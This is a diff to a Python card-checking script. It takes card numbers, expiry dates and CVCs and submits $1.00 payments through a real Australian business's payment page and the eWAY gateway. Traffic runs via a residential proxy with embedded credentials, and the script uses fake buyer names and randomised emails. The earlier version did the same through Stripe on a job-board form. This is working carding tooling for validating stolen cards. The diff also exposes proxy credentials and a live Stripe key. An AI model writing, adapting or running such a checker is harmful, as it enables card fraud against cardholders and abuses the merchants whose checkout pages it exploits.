@@ -1,6 +1,10 @@
 import requests,re
+import random
+from proxy import reqproxy, make_request
 def Tele(ccx):
-	import requests
+	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_184b6dff-zone-ccworld:tnkilbv66jns"
+	session, ip = reqproxy(proxy_str)
+	#print(f"IP Address: {ip}")
 	ccx=ccx.strip()
 	n = ccx.split("|")[0]
 	mm = ccx.split("|")[1]
@@ -8,66 +12,191 @@ def Tele(ccx):
 	cvc = ccx.split("|")[3]
 	if "20" in yy:#Mo3gza
 		yy = yy.split("20")[1]
+	if "01" or "02" or "03" or "04" or "05" or "06" or "07" or "08" or "09" in mm:
+		mm = mm.split("0")[1]
 	r = requests.session()
 
+	random_amount1 = random.randint(1, 9)
+	random_amount2 = random.randint(1, 99)
+	
 	headers = {
-	    'authority': 'api.stripe.com',
-	    'accept': 'application/json',
+	    'authority': 'www.katieroberts.com.au',
+	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'cache-control': 'max-age=0',
+	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'document',
+	    'sec-fetch-mode': 'navigate',
+	    'sec-fetch-site': 'none',
+	    'sec-fetch-user': '?1',
+	    'upgrade-insecure-requests': '1',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+	}
+	        
+	response = session.get('https://www.katieroberts.com.au/payments/', headers=headers)
+	        
+	csrf = re.search(r'name="csrf" value="(.*?)"', response.text).group(1)
+	#print(csrf)
+	        
+	headers = {
+	    'authority': 'www.katieroberts.com.au',
+	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'cache-control': 'max-age=0',
 	    'content-type': 'application/x-www-form-urlencoded',
-	    'origin': 'https://js.stripe.com',
-	    'referer': 'https://js.stripe.com/',
+	    'origin': 'https://www.katieroberts.com.au',
+	    'referer': 'https://www.katieroberts.com.au/payments/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
-	    'sec-fetch-site': 'same-site',
-	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
-	}
-	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F7f05e4e5d2%3B+stripe-js-v3%2F7f05e4e5d2%3B+card-element&key=pk_live_51JqnrtHyTJQ5PN2KMBmdNqJghqcjNLcPHzvwgC0sviEUgub1X1q1f0GTvoiEw11drDqfsYkndJCrmhms3yIY520500nssRiBAV'
-	
-	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
-	
-	pm = response.json()['id']
-	
-	headers = {
-	    'authority': 'pcdn.global',
-	    'accept': '*/*',
-	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://pcdn.global',
-	    'referer': 'https://pcdn.global/organizations/post-a-job/',
-	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
-	    'sec-ch-ua-mobile': '?1',
-	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'empty',
-	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-dest': 'document',
+	    'sec-fetch-mode': 'navigate',
 	    'sec-fetch-site': 'same-origin',
+	    'sec-fetch-user': '?1',
+	    'upgrade-insecure-requests': '1',
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
-	    'x-requested-with': 'XMLHttpRequest',
 	}
-	
+	        
 	params = {
-	    't': '1747184749231',
+	    'action': 'payment',
 	}
-	
+	        
 	data = {
-	    'data': f'__fluent_form_embded_post_id=72&_fluentform_4_fluentformnonce=30ba2302fd&_wp_http_referer=%2Forganizations%2Fpost-a-job%2F&post_title=Coach&job_location=Street+27&jobtypes%5B%5D=49006&jobcategories%5B%5D=49121&post_content=%3Cp%3ECoach%3C%2Fp%3E&method_application=Email&application_email=rodamuser08%40gmail.com&organization_name=Coach&email_payment_receipt=rodamuser08%40gmail.com&short_description_organization=&url_websiteorganization=&url_twitter=&url_linkedin=&payment-coupon=&jobplan=49067&payment_starter=5&payment_method=stripe&__ff_all_applied_coupons=&__ff_all_applied_coupons=&__ff_all_applied_coupons=&vQzhaGNUxWl=beEL5amJA7&OfyNsP=No4ABJEDI2qV7Pf&oKNVZHQAg=DlwTX6WoHy.iac2&yApuzwiPZWMc=JiOEpoaZDV21Ncs7&featured_image%5B%5D=https%3A%2F%2Fpcdn.global%2Fwp-content%2Fuploads%2Ffluentform%2Ftemp%2F11cuREUldOwsoIUmXu0xrnhHRIy6sn1NHCQ7faBRMPJrV%2BPQpuNZkg%2F9es0KJvi8OrOysNd0s%2BZn01A8o7Aj5sRPLXL8UOfCTERXNoMsO6kcUwcUHu8EOdWyQgBiXjbm1TxFbGzXYCZPn78%2By3ZP4g%3D%3D&__stripe_payment_method_id={pm}',
-	    'action': 'fluentform_submit',
-	    'form_id': '4',
-	    'vQzhaGNUxWl': 'beEL5amJA7',
-	    'OfyNsP': 'No4ABJEDI2qV7Pf',
-	    'oKNVZHQAg': 'DlwTX6WoHy.iac2',
-	    'yApuzwiPZWMc': 'JiOEpoaZDV21Ncs7',
+	    'title': 'Payment',
+	    'csrf': f'{csrf}',
+	    'csrf-hp': '',
+	    'krccYfdjk_adlPH': '',
+	    'krccFJK_FHPC': '',
+	    'krccFirstName': 'Rodam',
+	    'krccLastName': 'User',
+	    'krccBehalfOf': '',
+	    'krccEmail': f'rodamuser{random_amount1}{random_amount2}@gmail.com',
+	    'serviceType[]': 'JSC',
+	    'krccOtherService': '',
+	    'krccAmount': '1.00',
 	}
-	
-	response = requests.post('https://pcdn.global/wp-admin/admin-ajax.php', params=params, headers=headers, data=data)
-	
-	try:	
-		result = re.search(r'"errors":"Stripe Error: (.*?)"', response.text).group(1)
-	except:
-		result = response.text
-			
+	        
+	response = session.post('https://www.katieroberts.com.au/payments/', params=params, headers=headers, data=data)
+	        
+	AccessCode = re.search(r"var mpAccessCode = '(.*?)'", response.text).group(1)
+	#print(AccessCode)
+	        
+	headers = {
+	    'Accept': '*/*',
+	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'Connection': 'keep-alive',
+	    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+	    'Origin': 'https://secure.ewaypayments.com',
+	    'Referer': f'https://secure.ewaypayments.com/sharedpage/sharedpayment?AccessCode={AccessCode}',
+	    'Sec-Fetch-Dest': 'empty',
+	    'Sec-Fetch-Mode': 'cors',
+	    'Sec-Fetch-Site': 'same-origin',
+	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+	    'X-Requested-With': 'XMLHttpRequest',
+	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	}
+	        
+	data = {
+	    'EWAY_ACCESSCODE': f'{AccessCode}',
+	    'EWAY_ISSHAREDPAYMENT': 'true',
+	    'EWAY_APPLYSURCHARGE': 'true',
+	    'AMEXEC_ENCRYPTED_DATA': '',
+	    'EWAY_CUSTOMERREADONLY': 'True',
+	    'VISA_CHECKOUT_APIKEY': 'ME3VTMA94JVB2C5TDJ5X21w9TZo5QjaHuIis_MwMtFASXTFog',
+	    'VISA_CHECKOUT_ENCRYPTIONKEY': '6ADOIUMA6MPQI2I7WXGQ14FrJpwQ1xXQkiI-IScww7yu-hvtA',
+	    'FLAG_SHOW_SHIPADDR': 'False',
+	    'FLAG_SHOW_CUSTADDR': 'True',
+	    'FLAG_SHOW_SHIPPINGDETAILS': 'True',
+	    'PAYMENT_TRANTYPE': 'Purchase',
+	    'APPLEPAY_NETWORKTOKEN': '',
+	    'EWAY_GOOGLEPAY_NETWORKTOKEN': '',
+	    'EWAY_CUSTOMERFIRSTNAME': 'Rodam',
+	    'EWAY_CUSTOMERLASTNAME': 'User',
+	    'EWAY_CUSTOMEREMAIL': f'rodamuser{random_amount1}{random_amount2}@gmail.com',
+	    'EWAY_CUSTOMERSTREET1': '',
+	    'EWAY_CUSTOMERSTREET2': '',
+	    'EWAY_CUSTOMERCITY': '',
+	    'Customer.Country': 'AU',
+	    'Customer.State.dropbox': 'ACT',
+	    'Customer.State.textbox': '',
+	    'EWAY_CUSTOMERPOSTALCODE': '',
+	    'EWAY_CUSTOMERPHONE': '',
+	    'EWAY_SHIPPINGFIRSTNAME': '',
+	    'EWAY_SHIPPINGLASTNAME': '',
+	    'EWAY_SHIPPINGEMAIL': '',
+	    'EWAY_SHIPPINGSTREET1': '',
+	    'EWAY_SHIPPINGSTREET2': '',
+	    'EWAY_SHIPPINGCITY': '',
+	    'ShippingAddress.Country': '',
+	    'ShippingAddress.State.dropbox': 'ACT',
+	    'ShippingAddress.State.textbox': '',
+	    'EWAY_SHIPPINGPOSTALCODE': '',
+	    'EWAY_SHIPPINGPHONE': '',
+	    'EWAY_CARDNUMBER': f'{n}',
+	    'EWAY_CARDNAME': 'Dao Khao Saard',
+	    'EWAY_CARDEXPIRYMONTH': f'{mm}',
+	    'EWAY_CARDEXPIRYYEAR': f'{yy}',
+	    'EWAY_CARDCVN': f'{cvc}',
+	}
+	        
+	response = session.post(
+	    'https://secure.ewaypayments.com/sharedpage/SharedPayment/ProcessPayment',
+	    headers=headers,
+	    data=data,
+	)
+	        
+	headers = {
+	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'Connection': 'keep-alive',
+	    'Referer': f'https://secure.ewaypayments.com/sharedpage/sharedpayment?AccessCode={AccessCode}',
+	    'Sec-Fetch-Dest': 'document',
+	    'Sec-Fetch-Mode': 'navigate',
+	    'Sec-Fetch-Site': 'same-origin',
+	    'Sec-Fetch-User': '?1',
+	    'Upgrade-Insecure-Requests': '1',
+	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	}
+	        
+	params = {
+	    'AccessCode': f'{AccessCode}',
+	}
+	        
+	response = session.get(
+	    'https://secure.ewaypayments.com/sharedpage/sharedpayment/Result',
+	    params=params,
+	    headers=headers,
+	)
+	        
+	headers = {
+	    'authority': 'www.katieroberts.com.au',
+	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'referer': 'https://secure.ewaypayments.com/',
+	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'document',
+	    'sec-fetch-mode': 'navigate',
+	    'sec-fetch-site': 'cross-site',
+	    'sec-fetch-user': '?1',
+	    'upgrade-insecure-requests': '1',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+	}
+	        
+	params = {
+	    'action': 'response',
+	    'AccessCode': f'{AccessCode}',
+	}
+	        
+	response = session.get('https://www.katieroberts.com.au/payments/', params=params, headers=headers)
+	        
+	result = re.search(r'<h2 class="padding_L_20px padding_B_25px">(.*?)</h2>', response.text).group(1)
 	return (result)
